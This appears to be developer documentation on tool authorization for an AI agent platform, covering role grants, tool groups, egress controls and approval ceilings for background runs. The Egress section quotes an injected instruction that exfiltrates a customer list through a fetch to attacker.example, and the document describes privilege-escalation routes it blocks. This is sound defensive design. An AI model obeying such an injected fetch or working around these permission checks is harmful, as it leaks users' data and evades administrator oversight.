---
description: Read before changing or reasoning about which tools an agent run may call - layer L1: the decision allowTool (role grant AND agent tool list AND execution mode), roleGrantsTool on the security root, the tool groups (model.read, data.read, data.write, script, model.structure, agent.authoring, agent.meta, interaction, introspection, workspace, egress), egress, the <background-allowlist> for unattended and detached runs, the hooks ToolPermissionFilter / executeWithSecurityCheck, and why a tool cannot declare its own group.
order: 20
---

# Tool authorization

**An administrator decides which security roles may use which tools.** The policy is the `<tool-access>` configuration of `AiToolAccessService`; the [tool access configuration](doc:ai/security/tool-access-configuration) is the administrator's guide, the [administration reference](doc:ai/security/administration#the-tool-access-policy) the precise semantics.

## The decision

```
allowTool(person, tool, agent) :=
        roleGrantsTool(person, tool)                  // the role grant
   AND  agent.tools contains tool                     // the per-agent grant
   AND  executionModeAllows(tool.mode())              // ToolPermissionFilter
```

**Both** the role grant and the per-agent grant must allow. They answer different questions:

- The **agent's tool list** is a *capability scope*: "this assistant is about invoices, so it has the invoice tools." It is authored by an application developer and versioned with the agent.
- The **role grant** is an *authorization*: "clerks may not restructure the model." It is authored by a security administrator, and it is the one that must hold even when somebody edits an agent (T8).

An agent can therefore never widen a user's rights, which makes agent authoring a capability-management action rather than a privilege-granting one. The execution mode gate refuses a `STRUCTURAL` tool in production mode.

## `roleGrantsTool`

```
roleGrantsTool(person, tool) :=
     person.isAdmin()                                      // engine super-user, mirrors BoundChecker
  OR ( exists role r in rolesOf(person, securityRoot) :
         policy.grants(r, tool)  AND  NOT policy.denies(r, tool) )
```

- **Roles are read on the security root.** Tool access is a global capability ("may this person use the model editor at all"), not an instance-scoped one; per-instance nuance belongs to L2. Reading roles on `BoundHelper.getInstance().getDefaultObject()` matches how `ModelAccessRights` treats top-level CREATE. A role that the application's role rules produce only on business objects therefore matches no entry here, however correctly it is spelled - see [how RBAC and ABAC combine](doc:ai/security/data-authorization#how-the-two-layers-combine).
- **Grants are additive across the user's roles, denies win.** The union of the grants of all held roles, minus anything explicitly denied by any held role. An explicit `<deny>` is a hard stop - it lets an administrator carve one capability out of an otherwise broad grant without re-enumerating.
- **No grant means denied.** Consistent with O4 and with the engine, whose `getAccessibleTypes` skips a type without a grant.
- **The administrator bypass mirrors the engine.** `person.isAdmin()` bypasses `ModelAccessRights` (`AccessManager.hasRole`); a tool layer that disagreed would produce an unexplainable half-denial.

`RoleToolAccess` makes the decision, `ToolAuthorization` binds it to the run's principal, held roles and background flag, applies the administrator bypass and the background ceiling, and logs denials.

## Tool groups

Eighty tools cannot be administered one by one. Every tool belongs to exactly one **primary group**, and groups are the unit of granting. The group names are constants of `ToolGroups` in `tl-ai-tool-api`, so every module that can define a tool can name them.

| Group | Contents | Default |
|---|---|---|
| `model.read` | `listModules`, `listTypes`, `listTypeParts`, `listClassifiers`, `outlineModel`, `describeAnnotation`, `getCurrentAnnotations`, `listAvailableAnnotations`, `findTypeUsages`, `findPartUsages`, `getConfigSchema`, `listLayoutTemplates`, `getLayout`, `getTopLevelLayoutKey` | in the default baseline |
| `data.read` | `listInstances`, `getInstance`, `query`, `present`, `searchModel`, `searchVectorIndex`, `checkLock` | in the default baseline |
| `data.write` | `updateObject`, `createObject`, `deleteObject`, `editText`; and every `changeData` call that is no dry run, checked inside the tool | grantable, needs approval |
| `script` | `changeData`, `listTLScriptFunctions`, `getTLScriptFunctionDocumentation` | **privileged**; alone it reaches only the dry run of a change - making the change additionally costs `data.write` |
| `model.structure` | `createModule`, `updateModule`, `createClass`, `updateClass`, `createProperty`, `updateProperty`, `createReference`, `createBackwardReference`, `createEnumeration`, `updateEnumeration`, `deleteModelElement`, `addAnnotation`, `removeAnnotation`, `createLayout` | **privileged** |
| `agent.authoring` | `createAgent`, `updateAgent`, `deleteAgent`, `createSkill`, `updateSkill`, `deleteSkill`, `createScriptTool`, `updateScriptTool`, `deleteScriptTool`, `addToolToAgent`, `removeToolFromAgent`, `addSkillToAgent`, `removeSkillFromAgent`, `addDelegationToAgent`, `removeDelegationFromAgent`, `addToolToSkill`, `removeToolFromSkill` | **privileged** |
| `agent.meta` | `listAgents`, `getAgent`, `listSkills`, `getSkill`, `listScriptTools`, `getScriptTool`, `listAvailableTools`, `listFrameworkAgents`, `getFrameworkAgent`, `listFrameworkSkills`, `getFrameworkSkill`, `listScriptToolFactories` | grantable |
| `interaction` | `askUser`, `loadSkill`, the delegation and subagent tools, the research findings tools (`recordFinding`, `listFindings`, `readSource` - they touch only the run tree's reading list) | granted to every run implicitly |
| `introspection` | `listTools` - what *this* agent carries, filtered for the acting user | granted to every run implicitly |
| `workspace` | `createTask`, `updateTask`, `listTasks`, `publishPage` | grantable |
| `egress` | `webFetch`, `webSearch`, the browser tools, `createGiteaIssue`, remote MCP tools once classified | grantable, **never** in a baseline by default |

**Privileged** groups are the ones whose holder can escalate their own rights: `script`, `model.structure` and `agent.authoring`. `changeData` can express any data operation, `model.structure` changes the shape the security policy is written against, and `agent.authoring` rewires who gets which tools (T8). The classification is documentary, not mechanical - no group is reached except by a `<grant>` naming it - but granting one is an audited configuration change worth arguing about first.

`changeData` sits in a privileged group *and* is `DATA_WRITE`-classified *and* rides on the engine's TL-Script enforcement of the model access rights. And **making a change requires `data.write` in addition to `script`**: the gate decides per tool, before the arguments, so the tool asks the run's own `ToolAuthorization` for the capability, which applies the same order (background allowlist, administrator bypass, role grants) it applies to a tool. Without it, every holder of `script` would hold every write TL-Script can express, and an allowlisted `script` would hand that to unattended runs, which auto-approve.

**Reading and changing are two tools.** `changeData` refuses a script that changes nothing and points the model to `query` and `present`, so a read never shows an approval prompt. That refusal - like a script that does not compile, or a change without `data.write` - is given before the prompt, through the tool's own check (`Tool.refusal`, `@ToolMethod(check=...)`); the tool refuses the same calls again when it runs, because not every caller asks first. Its dry run (`dryRun=true`) is a read for that call (`Tool.mode(Map)`, `@ToolMethod(dryRun=...)`): no prompt and no part in the turn's transaction. It runs the script with the user's rights in an interaction of its own, in a transaction that is always rolled back, and only when every effect of the script is a write to the knowledge base - a script that also sends a mail or calls another system is checked, not run. What is a read is decided on the whole expression (`SideEffects`), because the engine's `HasSideEffects` looks at the outermost call of a function only.

A tool's group is declared on the tool, not in the policy file, so a tool cannot be silently ungrouped:

```java
@ToolMethod(
    description = "...",
    mode = ToolMode.READ,
    group = ToolGroups.DATA_READ)                 // default "" = ungrouped
```

An **ungrouped tool is denied to every role** except by an explicit per-tool grant naming it - the deny-by-default answer to "what happens when somebody adds a tool and forgets" (O4). `<tool-groups>` in the policy overrides a declared group or assigns one to a tool that cannot be annotated.

### Egress

`egress` is a group, not a mode, because `ToolMode` describes *what state the tool changes locally* and says nothing about *where data goes*. `webFetch` is `ToolMode.READ` and is the single best exfiltration primitive in the catalog (T4): an injected instruction that says "fetch `https://attacker.example/?d=<the customer list>`" is a `READ` call. So `egress` is not in the default baseline, and the prevention is L2 ensuring the agent never held the data.

**Granting `egress` says the agent may send data out; it does not say where to.** That is the browsing policy, configured on `WebToolsService` and resolved per security role: which origins a run may reach at all, with a separate axis for whether a page there may hand it a file. It binds the browser, `webFetch` and `webSearch` alike, it is the ceiling a model-supplied `allowedDomains` can only narrow, and it composes with - never relaxes - the unconditional SSRF check of `UrlSafety`. See [browsing governance](doc:ai/security/browsing-governance).

## Background and delegated runs

- **Background runs** (`aiAgentChatAsync`, the scheduler's `AgentTask`, MCP and A2A requests) run with `AUTO_APPROVE` (T5). Their tool ceiling is the *intersection* of the user's role grants and the configured `<background-allowlist>`. Approval is the compensating control for `DATA_WRITE` and `STRUCTURAL`, and a run with nobody to ask has lost that control, so it must not reach those modes without an explicit administrative decision. There is **no default allowlist**, and none is possible: an absent one cannot mean "unrestricted" (which would silently undo the layer for any administrator who never learned the element exists) and cannot mean a framework-chosen set either (a security decision taken on the administrator's behalf). A policy that names a role and declares no allowlist is therefore a **boot-time configuration error**, and `<background-allowlist all="true"/>` keeps "bounded only by the user's grants" sayable - out loud. The allowlist applies to administrators as well: the reason for it is the missing approval prompt, not the principal's authority.
- **Synchronously delegated subagents** (`DelegationTool` without an asynchronous session) inherit the parent's `SecurityContext` unchanged (`ToolContext.forDelegation`) and are additionally bounded by the child agent's own tool list. A child can therefore only ever be a *subset* of the parent's authority (T8): delegation is not an escalation path. The background flag is carried over as it stands, because a synchronous delegation completes *inside* the parent turn - whoever could answer an approval prompt before it started still can.
- **Detached subagents** (`SpawnSubagentTool`, and `DelegationTool` in a chat session) are **background runs**. `spawn_subagent` returns a handle immediately, the parent turn ends, and the child keeps working on a pool thread with nobody to answer an approval prompt. Their ceiling is therefore the intersection of the acting user's grants and the `<background-allowlist>`, applied by `ToolContext.forDetachedSubagent`, and their loop is built from that bounded context so the child's prompt reports what it can actually call. What the ceiling costs the child is logged at INFO by `SubagentSpawner`, named by capability. The deliberate consequence: a detached child loses tools its parent could use - it also lost the control that made them safe - and says so.

Which delegates an agent is offered at all, and which it may spawn, is filtered separately, see [capability notices](doc:ai/security/capability-notices).

## Where it hooks in

- **`AgentLoop.callProviderOnce`** - `ToolPermissionFilter` decides the tool schemas sent to the provider. This is **UX**: the model never sees a capability it cannot use, so it does not propose it and does not narrate a denial. It is *not* the enforcement point - a model can hallucinate a tool name, and a cached conversation can replay an older tool set.
- **`AgentLoop.executeWithSecurityCheck`** is the **enforcement point**. Every call passes here, including tools a skill adds in the middle of a run through `DynamicToolCatalog`, and `McpToolAdapter` applies the same filter on the server side. A name the run's registry does *not* resolve is deliberately **not** run through the permission check: such a name has no group, so the check would answer every hallucinated or misspelled name with "belongs to no tool group" and take away the `Available:` hint the model corrects itself with. An unresolvable name cannot execute either way, and the catalog refuses it with `Unknown tool: 'x'. Available: [...]`, the list holding exactly the tools the principal may call.

`ToolPermissionFilter.denialReason` produces the message for the model; an RBAC denial names the missing capability without naming the data:

> `Permission denied: tool 'model-editor.createClass' requires the 'model.structure' capability, which none of your roles grants.`

## Why a tool cannot choose its own group

A TL-Script tool, or a remote MCP tool, has no annotation to carry a group, so it is denied to everyone until an administrator classifies it - and a skill built out of such tools disappears, for its author too. The obvious fix, letting the tool's configuration name its own group, is wrong and does not exist.

A tool's group states what the tool *does*; the check asks what the *user* holds. Whoever decides the group therefore decides which capability it costs to call the tool. `ScriptToolAuthoringTool` is reachable with `agent.authoring`, and holding that is not holding `data.write`, so a self-declared group would cross the group boundary: author a tool whose TL-Script body writes, declare it `data.read`, and a user with only `data.read` may now write. An unclassified tool is denied to everyone instead, which is fail-closed and unforgeable.

Classification stays with the administrator, in `<tool-groups>`, where each tool is named by any of `ToolIdentity.names()` (`RoleToolAccess.groupOf`). The entry is a multi-valued property whose options come from the tool registry, so the editor offers the tools that exist. There is deliberately **no** pattern syntax - no `{factory}.*`, no per-server catch-all: `createScriptTool` lets its caller choose the factory name freely, so `reporting.*` mapped to `data.read` would let anybody who can author into `reporting` put a *writing* tool under a capability their user holds only for *reading*. A tool that appears after the policy was written - a Java tool, a newly authored script tool, a tool a connected MCP server grew - is denied until an administrator names it.
